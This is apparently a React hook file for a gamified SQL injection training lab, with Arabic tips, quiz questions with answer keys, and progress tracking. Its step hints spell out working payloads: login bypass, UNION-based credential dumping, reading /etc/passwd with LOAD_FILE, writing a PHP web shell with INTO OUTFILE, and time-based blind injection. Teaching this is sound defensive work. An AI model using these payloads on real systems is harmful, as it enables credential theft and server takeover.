import { useState, useCallback } from 'react'
import { useProgress } from '../../context/ProgressContext'
import type { ChallengeData } from '../../components/ChallengeStep'

export interface MissionStep {
    id: number
    tool: 'terminal' | 'zoogle' | 'linkedin' | 'quiz' | 'login'
    type: 'action' | 'challenge'
    title: string
    objective: string
    hint: string
    quipAr: string
    completed: boolean
    challengeData?: ChallengeData
}

const STORAGE_KEY = 'cybermasry_lab04_progress'

const INITIAL_STEPS: MissionStep[] = [
    {
        id: 1, tool: 'terminal', type: 'action', title: 'Test for SQLi (Error-Based)',
        objective: 'Enter a single quote in the username field to trigger a SQL error and confirm the vulnerability.',
        hint: "' (single quote in the username field)",
        quipAr: 'فلتة صغيرة في الكود بتكسر الـ SQL query — جرب \' في خانة الاسم 🎯',
        completed: false,
    },
    {
        id: 2, tool: 'terminal', type: 'action', title: 'Classic Auth Bypass',
        objective: "Use the classic SQL injection: ' OR '1'='1 to bypass login without a password.",
        hint: "' OR '1'='1",
        quipAr: 'أشهر SQLi في التاريخ — OR 1=1 بتخلي الشرط دايماً صح 😈',
        completed: false,
    },
    {
        id: 3, tool: 'terminal', type: 'action', title: 'Comment-Based Bypass',
        objective: "Use comment syntax to cut off the rest of the SQL query: admin'--",
        hint: "admin'--",
        quipAr: '-- في SQL يعني "تجاهل باقي السطر" — بتعمل inject وبتشيل الباقي 💬',
        completed: false,
    },
    // ── Challenge 1: Comment Injection ──
    {
        id: 4, tool: 'terminal', type: 'challenge', title: '🧠 Challenge: SQL Comments',
        objective: 'Test your understanding of SQL comment injection.',
        hint: '', quipAr: 'ال -- ليها سر! 💡',
        completed: false,
        challengeData: {
            question: 'What does -- do at the end of a SQL injection payload like admin\'--?',
            options: [
                'It deletes the database',
                'It comments out the rest of the SQL query, bypassing the password check',
                'It encrypts the payload to avoid detection',
                'It creates a new admin account in the database',
            ],
            correctIndex: 1,
            hint: 'The original query expects a password after the username. What happens if we comment out that part?',
            points: 10,
            hintPenalty: 5,
        },
    },
    {
        id: 5, tool: 'terminal', type: 'action', title: 'Find Number of Columns',
        objective: 'Use ORDER BY to determine how many columns are in the result set.',
        hint: "' ORDER BY 3--",
        quipAr: 'عشان تعمل UNION attack صح، لازم تعرف عدد الأعمدة الأول 🔢',
        completed: false,
    },
    {
        id: 6, tool: 'terminal', type: 'action', title: 'UNION-Based Data Extraction',
        objective: 'Use UNION SELECT to inject your own query and extract database version.',
        hint: "' UNION SELECT 1,version(),3--",
        quipAr: 'UNION SELECT بيخليك تضيف query تانية جنب الأصلية وتجيب بيانات تانية 🗄️',
        completed: false,
    },
    {
        id: 7, tool: 'terminal', type: 'action', title: 'Extract Table Names',
        objective: "Query information_schema to list all tables in the database.",
        hint: "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
        quipAr: 'information_schema ده دليل شامل لكل حاجة في الـ database 📚',
        completed: false,
    },
    {
        id: 8, tool: 'terminal', type: 'action', title: 'Dump User Credentials',
        objective: 'Extract all usernames and password hashes from the users table.',
        hint: "' UNION SELECT 1,concat(username,':',password),3 FROM users--",
        quipAr: 'جمعنا username وpassword مع بعض بـ concat — كل الحسابات في يدنا 😈',
        completed: false,
    },
    // ── Challenge 2: UNION Attacks ──
    {
        id: 9, tool: 'terminal', type: 'challenge', title: '🧠 Challenge: UNION SELECT',
        objective: 'Test your understanding of UNION-based SQL injection.',
        hint: '', quipAr: 'concat هو سلاحك! 🔗',
        completed: false,
        challengeData: {
            question: 'Why is concat(username,\':\',password) used in UNION-based SQL injection attacks?',
            options: [
                'To encrypt the data before extracting it',
                'To combine multiple columns into a single output field so we can exfiltrate more data',
                'To create new users in the target database',
                'To delete the password column from the table',
            ],
            correctIndex: 1,
            hint: 'UNION SELECT must match the column count. If we only have one display field, concat merges multiple values into it...',
            points: 10,
            hintPenalty: 5,
        },
    },
    {
        id: 10, tool: 'terminal', type: 'action', title: 'Identify Hash Type',
        objective: 'The passwords are hashed — identify the hash type by length and format.',
        hint: "' UNION SELECT 1,length(password),3 FROM users LIMIT 1--",
        quipAr: '32 حرف = MD5. 64 حرف = SHA256. بعد ما تعرف النوع، تقدر تعمل crack 🔓',
        completed: false,
    },
    {
        id: 11, tool: 'terminal', type: 'action', title: 'Read Local Files (Advanced)',
        objective: 'Use LOAD_FILE to read the server config file if MySQL has FILE privilege.',
        hint: "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
        quipAr: 'لو MySQL شغال بـ root privilege، تقدر تقرأ أي ملف على السيرفر 😱',
        completed: false,
    },
    {
        id: 12, tool: 'terminal', type: 'action', title: 'Write a Web Shell',
        objective: 'Use INTO OUTFILE to write a PHP backdoor to the web root.',
        hint: "' UNION SELECT 1,'<?php system($_GET[cmd]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--",
        quipAr: 'SQLi → RCE! بتكتب PHP shell للـ web root وبتتحكم في كل السيرفر 💀',
        completed: false,
    },
    // ── Challenge 3: Defense ──
    {
        id: 13, tool: 'terminal', type: 'challenge', title: '🧠 Challenge: SQLi Defense',
        objective: 'Test your understanding of SQL injection prevention.',
        hint: '', quipAr: 'الهجوم مهم — بس الدفاع أهم! 🛡️',
        completed: false,
        challengeData: {
            question: 'What is the most effective defense against SQL injection attacks?',
            options: [
                'Using HTTPS encryption on all pages',
                'Hiding the login form behind a CAPTCHA',
                'Using parameterized queries (prepared statements) so user input is never treated as SQL code',
                'Changing the database password every week',
            ],
            correctIndex: 2,
            hint: 'The root cause of SQLi is mixing user input with SQL code. What separates them?',
            points: 10,
            hintPenalty: 5,
        },
    },
    // --- Extra 1: Blind SQLi ---
    {
        id: 14, tool: 'terminal', type: 'action', title: 'Extra: Sleep Injection',
        objective: 'Boolean blind SQLi test with SLEEP() function.',
        hint: "' OR SLEEP(5)--",
        quipAr: 'عشان مفيش error بيظهر، لازم تستخدم الـ sleep. ⏱️',
        completed: false,
    },
    {
        id: 15, tool: 'terminal', type: 'action', title: 'Extra: Binary Search DB',
        objective: 'Build the query to iteratively guess characters.',
        hint: "' OR IF(ASCII(SUBSTRING(version(),1,1))>100,SLEEP(5),0)--",
        quipAr: 'ابني الاستعلام حرف بحرف. العملية محتاجة شوية صبر! 🐢',
        completed: false,
    },
    {
        id: 16, tool: 'terminal', type: 'action', title: 'Extra: Password Recovered',
        objective: 'Recover the password using timing differences.',
        hint: 'submit_flag 5c3r3tp4ss',
        quipAr: 'ممتاز! ده الباسورد المخفي. 🔑',
        completed: false,
    },
    // --- Extra 2: Second Order ---
    {
        id: 17, tool: 'terminal', type: 'action', title: 'Extra: Account Profile Injection',
        objective: 'Deposit the SQL injection payload in the profile description.',
        hint: "update_profile \"admin'--\"",
        quipAr: 'اكتب الكود الخبيث في البروفايل بتاعك. 💣',
        completed: false,
    },
    {
        id: 18, tool: 'terminal', type: 'action', title: 'Extra: Wait for Admin',
        objective: 'Wait for admin verification component to trigger.',
        hint: "wait 60",
        quipAr: 'استنى لما الـ Admin يفتح الصفحة. ⏳',
        completed: false,
    },
    {
        id: 19, tool: 'terminal', type: 'action', title: 'Extra: Extract Delayed Payload',
        objective: 'Payload executed externally, verify execution.',
        hint: 'submit_flag 2nd_order_win',
        quipAr: 'ضربت! الداتا اتسحبت. 💥',
        completed: false,
    },
]

function loadProgress(): MissionStep[] {
    try {
        const raw = localStorage.getItem(STORAGE_KEY)
        if (!raw) return INITIAL_STEPS
        const completedIds: number[] = JSON.parse(raw)
        return INITIAL_STEPS.map((s) => ({ ...s, completed: completedIds.includes(s.id) }))
    } catch {
        return INITIAL_STEPS
    }
}

function saveProgress(steps: MissionStep[]) {
    const completedIds = steps.filter((s) => s.completed).map((s) => s.id)
    localStorage.setItem(STORAGE_KEY, JSON.stringify(completedIds))
}

export function useMissionProgress(labId: string) {
    const { saveStep } = useProgress()
    const [steps, setSteps] = useState<MissionStep[]>(loadProgress)

    const currentStepId = steps.find((s) => !s.completed)?.id ?? null
    const allComplete = steps.every((s) => s.completed)
    const completedCount = steps.filter((s) => s.completed).length

    const completeStep = useCallback((stepId: number) => {
        setSteps((prev) => {
            const next = prev.map((s) => (s.id === stepId && !s.completed ? { ...s, completed: true } : s))
            if (next !== prev) {
                saveProgress(next)
                const completedCnt = next.filter((s) => s.completed).length
                const isFinal = completedCnt === next.length
                saveStep(labId, stepId, 200, isFinal)
            }
            return next
        })
    }, [labId, saveStep])

    const resetProgress = useCallback(() => {
        localStorage.removeItem(STORAGE_KEY)
        setSteps(INITIAL_STEPS)
    }, [])

    return { steps, currentStepId, allComplete, completedCount, completeStep, resetProgress }
}

export function getLabProgress() {
    try {
        const raw = localStorage.getItem(STORAGE_KEY)
        const completedIds: number[] = raw ? JSON.parse(raw) : []
        return { completedCount: completedIds.length, totalSteps: INITIAL_STEPS.length, pct: Math.round((completedIds.length / INITIAL_STEPS.length) * 100) }
    } catch {
        return { completedCount: 0, totalSteps: INITIAL_STEPS.length, pct: 0 }
    }
}
